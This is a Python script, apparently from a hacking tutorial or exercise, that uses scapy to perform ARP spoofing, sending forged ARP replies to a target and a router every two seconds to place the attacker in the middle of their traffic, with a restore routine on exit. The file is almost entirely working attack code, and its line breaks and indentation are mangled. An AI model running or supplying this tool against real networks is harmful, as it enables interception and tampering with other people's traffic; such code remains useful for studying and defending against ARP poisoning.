import sys
import scapy.all as scapy
import time
import optparse
def get_ip():
 parser = optparse.OptionParser()
 parser.add_option("-r", "--router_ip_address", dest="router_ip", help="Please enter your 
router IP address")
 parser.add_option("-t", "--target_ip_address", dest="target_ip", help="Please enter your 
target IP address")
 
(options, arguments) = parser.parse_args()
 
if not options.router_ip:
 
parser.error("---------------- Please specify router IP address---------------------")
 
if not options.target_ip:
 
parser.error("---------------- Please specify target IP address---------------------")
 
return options
def scan(ip):
 arp_request = scapy.ARP(pdst=ip)
 broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
 broadcast_arp_request = broadcast / arp_request
 
(answered, unanswered) = scapy.srp(broadcast_arp_request, timeout=1, verbose = False)
 
return answered[0][1].hwsrc
def spoofing(target_ip,spoof_ip):
 
target_mac = scan(target_ip)
 packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) # creating a 
packet to send it to the victim
 #packet_router = scapy.ARP(op=2, pdst="10.211.55.12", hwdst="00:11:22:33:44:83", 
psrc="10.37.129.3")
 
scapy.send(packet, verbose=False) # used for broadcasting the packet to the network
 #scapy.send(packet_router)
def restore(destination_ip, source_ip):
 destination_mac = scan(destination_ip)
 
source_mac = scan(source_ip)
 packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, 
hwsrc=source_mac)
 
scapy.send(packet, count=4, verbose=False)
packet_sent = 0
try:
 while True:
 
ip = get_ip()
 
spoofing(ip.router_ip, ip.target_ip) # router _ip and then target ip
 
spoofing(ip.target_ip,ip.router_ip)
 
packet_sent += 2
 
print("\rTotal Packets that have been spent "+ str(packet_sent)," packets", end ="")
 
sys.stdout.flush()
 
time.sleep(2)
except KeyboardInterrupt:
 
restore(ip.router_ip, ip.target_ip) # router _ip and then target ip
 
restore(ip.target_ip, ip.router_ip)
 print("The user stopped the spoofing process")
# packet = scapy.ARP(op=2, pdst="10.37.129.3", hwdst="00:1c:42:42:0c:18", psrc = 
"10.211.55.12")
# print(packet.show())
# print(packet.summary())
# scapy.ls(scapy.ARP)
